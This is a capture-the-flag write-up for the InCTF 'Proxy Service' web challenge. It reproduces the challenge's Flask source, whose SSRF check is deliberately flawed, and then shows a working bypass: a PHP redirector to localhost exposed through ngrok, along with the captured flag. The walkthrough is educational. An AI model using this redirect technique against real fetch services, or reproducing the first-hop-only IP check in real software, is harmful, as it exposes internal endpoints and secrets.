
# 🧩 InCTF - Proxy Service (Web Challenge)

> **Category**: Web  
> **Difficulty**: Hard  
> **Points**: 400  
> **Flag Format**: `inctf{*}`  

![Challenge UI](https://github.com/user-attachments/assets/a18fe345-15ec-47b5-b11d-c16b675c400e)

---

## 🕵️ Challenge: Proxy Service

**Description:**

> I developed this proxy service for InCTF players.  
> You can use it to proxy anything on the internet.  
> But I'm sure that you will not be able to find my secret. If you can prove me wrong, the flag is all yours!  
> I'm so confident that I have even attached the source code somewhere.  
> Let the game begin.  
>  
> **Flag format:** `inctf{*}`

<!--
<div align="center">
  <img src="images/3.png" alt="Proxy Service Web Interface" width="80%" />
</div>
-->
![image](https://github.com/user-attachments/assets/0bd67937-ed89-4788-90eb-a7b1c2ad9574)

---

## 🔍 Challenge Page

Opening the challenge leads to a web page that claims to proxy a URL and return its content.

![image](https://github.com/user-attachments/assets/a0467bbc-05d2-4258-ac96-490a7df981d4)

---

## 📜 Source Code Found via `/viewsource`

Inspecting the frontend revealed a hidden path hint in an HTML comment.

![image](https://github.com/user-attachments/assets/9e8b48cf-69e9-419e-8774-3ca18bf8fef5)


Visiting `/viewsource` discloses the Python backend logic:

```python
from flask import Flask, request, render_template, Response
from urllib.parse import urlparse
import ipaddress
import os
import requests
import time
import socket

app = Flask(__name__)

# Original flag in env variable
str_flag = os.getenv("FLAG", "inctf{this_is_fake_flag}")

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/proxy", methods=["POST"])
def do_request():
    try:
        url = request.form["url"]
        domain = urlparse(url).netloc

        if ":" in domain:
            domain = domain.split(":")[0]

        ip = socket.gethostbyname(domain)

        # block access to internal IPs
        if ipaddress.ip_address(ip).is_private or url.startswith("http") == False:
            return render_template("index.html", message="Access denied !")
        else:
            # Prevent Denial-of-Service attack
            time.sleep(3)
            print("Requesting: ", ip)
            r = requests.get(url)
            body = r.text
            return body

    except:
        return render_template("index.html", message="Some error occured")

@app.route("/viewsource")
def source():
    resp = Response(open("app.py").read())
    resp.headers['Content-Type'] = 'text/plain'
    return resp

@app.route("/gimme_tha_fleg")
def flag():
    # Allow flag access to internal IPs only
    if request.access_route[-1] == "127.0.0.1":
        return f"Welcome, {request.access_route[-1]}. Your flag is <code>{str_flag}</code>"
    else:
        return "Get outta here!", 403

if __name__ == "__main__":
    app.run(debug=False)

```
---

## 🔍 Vulnerability Analysis

Let’s break down the logic inside the proxy backend:

```python
ip = socket.gethostbyname(domain)
if ipaddress.ip_address(ip).is_private or url.startswith("http") == False:
    return render_template("index.html", message="Access denied!")
```

Here’s what it tries to do:

- Blocks **private/internal IPs** (e.g. 127.0.0.1, 192.168.0.0/16, etc.)
- Requires URLs to start with `http`

However, this **only checks the resolved IP** of the **initial domain**, not if it redirects to internal services!

---

## 🔄 Exploiting SSRF via Redirects

We host a PHP redirector locally:

```php
<?php header("Location: http://localhost/gimme_tha_fleg"); ?>
```

Save this as `index.php` and start a local PHP server:

![image](https://github.com/user-attachments/assets/097a8093-985b-4478-b3f6-d5581e903615)


```bash
php -S localhost:8080
```

Then we expose it to the internet using **ngrok**:

```bash
ngrok http 8080
```

![image](https://github.com/user-attachments/assets/a0d8cd44-35f0-445e-bef8-d82fa234203e)


---

## 🎯 Exploiting the Challenge

Now, enter the ngrok URL into the proxy field:

![image](https://github.com/user-attachments/assets/0945edea-3ee8-4dd7-98f8-7337f2fb2046)


The backend:

1. Resolves the ngrok domain (a public IP)
2. Allows the request ✅
3. Follows the HTTP 302 redirect to `http://localhost/gimme_tha_fleg`
![image](https://github.com/user-attachments/assets/7799d6fd-d629-4209-9173-61ddc1c5f849)

4. Since `request.access_route[0] == 127.0.0.1`, the flag is returned

---

## 🏁 Flag

After successful redirection, the response reveals the flag:

```html
Welcome, 127.0.0.1 Your flag is inctf{i_hacked_a_proxy_service_and_all_i_got_is_this_flag_:/}
```
![image](https://github.com/user-attachments/assets/0d22b2dd-8aca-4421-aa90-276930da0987)

---

## ✅ Summary

- Vulnerability: **SSRF with open redirect bypass**
- Server only blocks **initial domain resolution**, not redirects
- Using a **redirector**, we hit an internal endpoint from the outside

> **Lesson:** Always check the final destination of redirects, not just the first hop.

---

## 🎥 Video Walkthrough

Watch the full walkthrough here: [YouTube Link 🔗](https://youtu.be/EBxGCKXRG44?si=i3aW5L1ybAZ6e6I7)

---
